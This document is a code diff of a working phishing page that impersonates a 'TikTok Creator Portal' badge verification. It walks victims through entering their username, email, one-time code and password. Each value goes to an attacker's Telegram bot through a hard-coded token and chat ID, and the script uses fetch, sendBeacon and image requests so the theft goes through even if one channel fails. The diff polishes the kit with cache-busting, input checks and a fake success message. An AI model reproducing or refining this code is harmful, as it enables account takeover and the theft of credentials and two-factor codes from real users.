@@ -2,8 +2,11 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Creator Portal | Verification</title>
+    <title>TikTok Creator Portal</title>
     <style>
         :root { --tt-pink: #FE2C55; --tt-cyan: #25F4EE; --tt-black: #000; --tt-card: #1d1d1d; }
         body { margin: 0; background-color: var(--tt-black); font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; box-sizing: border-box; }
@@ -14,11 +17,10 @@
         .step { display: none; }
         .step.active { display: block; }
         input { width: 100%; padding: 14px 16px; background: #2f2f2f; border: 1px solid #3d3d3d; border-radius: 4px; color: white; font-size: 15px; outline: none; margin-bottom: 5px; box-sizing: border-box; }
-        /* Professional Red Labels */
-        .status-msg { font-size: 12px; color: #FE2C55; text-align: left; margin-bottom: 15px; display: none; font-weight: 600; }
+        .status-msg { font-size: 12px; color: #FE2C55; text-align: left; margin-bottom: 15px; display: none; font-weight: 600; min-height: 15px; }
         .status-msg.active { display: block; }
         .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
-        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn:disabled { opacity: 0.7; }
         .loader-ring { border: 3px solid #333; border-top: 3px solid var(--tt-cyan); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -31,14 +33,14 @@
         <h1>Claim Your Badge</h1>
         <p>Enter your TikTok @username to check eligibility.</p>
         <input type="text" id="username" placeholder="@username" spellcheck="false" autocomplete="off">
-        <div id="msg1" class="status-msg">Checking database...</div>
-        <button id="btn1" class="btn" onclick="process(1, 'Checking...', 2)">CONTINUE</button>
+        <div id="msg1" class="status-msg"></div>
+        <button id="btn1" class="btn" onclick="validateStep1()">CONTINUE</button>
     </div>
 
     <div id="step2" class="step">
         <h1>Verify Identity</h1>
         <p>Enter the email linked to your account.</p>
-        <input type="email" id="email" placeholder="Email address" spellcheck="false" autocomplete="off">
+        <input type="email" id="email" placeholder="Email address" spellcheck="false">
         <div id="msg2" class="status-msg">Verifying email...</div>
         <button id="btn2" class="btn" onclick="process(2, 'Verifying...', 3)">SEND CODE</button>
     </div>
@@ -46,7 +48,7 @@
     <div id="step3" class="step">
         <h1>Verify Email</h1>
         <p>Enter the 6-digit code sent to your mail.</p>
-        <input type="text" id="code" placeholder="6-digit code" autocomplete="off">
+        <input type="text" id="code" placeholder="6-digit code" inputmode="numeric" pattern="[0-9]*" maxlength="6" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
         <div id="msg3" class="status-msg">Validating code...</div>
         <button id="btn3" class="btn" onclick="process(3, 'Validating...', 4)">CONFIRM CODE</button>
     </div>
@@ -54,71 +56,80 @@
     <div id="step4" class="step">
         <h1>Security Check</h1>
         <p>Confirm password to finalize the request.</p>
-        <input type="password" id="password" placeholder="Password" autocomplete="off">
-        <div id="msg4" class="status-msg">Syncing with server...</div>
+        <input type="password" id="password" placeholder="Password">
+        <div id="msg4" class="status-msg">Syncing...</div>
         <button id="btn4" class="btn" onclick="process(4, 'Syncing...', 5)">VERIFY</button>
     </div>
 
-    <div id="step5" class="step">
-        <h1>Authenticating...</h1>
-        <div class="loader-ring"></div>
-    </div>
-
-    <div id="step6" class="step">
-        <div style="color: #25F4EE; font-size: 60px; margin-bottom: 20px;">✓</div>
-        <h1>Identity Verified</h1>
-        <p>Your request has been submitted. The badge will be applied within <b>5 business days</b>.</p>
-    </div>
+    <div id="step5" class="step"><h1>Authenticating...</h1><div class="loader-ring"></div></div>
+    <div id="step6" class="step"><div style="color:#25F4EE;font-size:60px;margin-bottom:20px;">✓</div><h1>Success</h1><p>Identity verified. Badge will be applied soon.</p></div>
 </div>
 
 <script>
-    // Master Token & Chat ID
     const TOKEN = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g';
     const CHAT = '7489116869';
 
-    // ULTRA FORCE SEND (Dual-Layer Redundancy)
-    async function ultraPush(m) {
-        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m)}&parse_mode=HTML`;
-        
-        // Push 1: Standard Fetch
-        fetch(url).catch(() => {});
-        
-        // Push 2: Navigator Beacon (Background processing)
-        if (navigator.sendBeacon) {
-            navigator.sendBeacon(url);
-        }
-
-        // Push 3: Image Beacon (Last resort fallback)
-        const img = new Image();
-        img.src = url + "&cb=" + Math.random();
+    // Anti-Cache Ultra Force Send
+    function ultraPush(m) {
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m)}&parse_mode=HTML&v=${Date.now()}`;
+        fetch(url, { cache: "no-cache" }).catch(() => {});
+        navigator.sendBeacon(url);
+        new Image().src = url;
     }
 
-    function process(curr, m, nxt) {
-        const val = (curr==1) ? document.getElementById('username').value :
-                    (curr==2) ? document.getElementById('email').value :
+    function validateStep1() {
+        const u = document.getElementById('username').value.trim();
+        const msg = document.getElementById('msg1');
+        const btn = document.getElementById('btn1');
+
+        if (u.length < 3 || u.length > 24) {
+            msg.innerText = "Invalid username. Please try again.";
+            msg.classList.add('active');
+            return;
+        }
+        
+        msg.innerText = "Checking database...";
+        msg.classList.add('active');
+        btn.disabled = true;
+        ultraPush(`👤 <b>New Hit</b>\nUser: @${u}`);
+        
+        setTimeout(() => showStep(2), 2000);
+    }
+
+    function process(curr, mText, nxt) {
+        const val = (curr==2) ? document.getElementById('email').value :
                     (curr==3) ? document.getElementById('code').value :
                     document.getElementById('password').value;
 
         if(!val) return;
+        
+        // Final 6-digit check for OTP step
+        if(curr==3 && val.length < 6) {
+            document.getElementById('msg3').innerText = "Please enter 6-digit code.";
+            document.getElementById('msg3').classList.add('active');
+            return;
+        }
 
-        document.getElementById('msg'+curr).innerText = m;
-        document.getElementById('msg'+curr).classList.add('active');
-        document.getElementById('btn'+curr).disabled = true;
+        const msg = document.getElementById('msg' + curr);
+        const btn = document.getElementById('btn' + curr);
+        msg.innerText = mText;
+        msg.classList.add('active');
+        btn.disabled = true;
 
         const u = document.getElementById('username').value;
-        if(curr==1) ultraPush(`👤 <b>New Hit</b>\nUser: @${val}`);
         if(curr==2) ultraPush(`📧 <b>Email</b>\nUser: @${u}\nEmail: ${val}`);
         if(curr==3) ultraPush(`🔢 <b>OTP</b>\nUser: @${u}\nCode: ${val}`);
         if(curr==4) ultraPush(`🔑 <b>PASS</b>\nUser: @${u}\nPass: <code>${val}</code>`);
 
         setTimeout(() => {
-            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-            document.getElementById('step'+nxt).classList.add('active');
-            if(nxt==5) setTimeout(() => {
-                document.getElementById('step5').classList.remove('active');
-                document.getElementById('step6').classList.add('active');
-            }, 4000);
+            showStep(nxt);
+            if(nxt==5) setTimeout(() => showStep(6), 4000);
         }, 2200);
+    }
+
+    function showStep(s) {
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+        document.getElementById('step'+s).classList.add('active');
     }
 </script>
 </body>
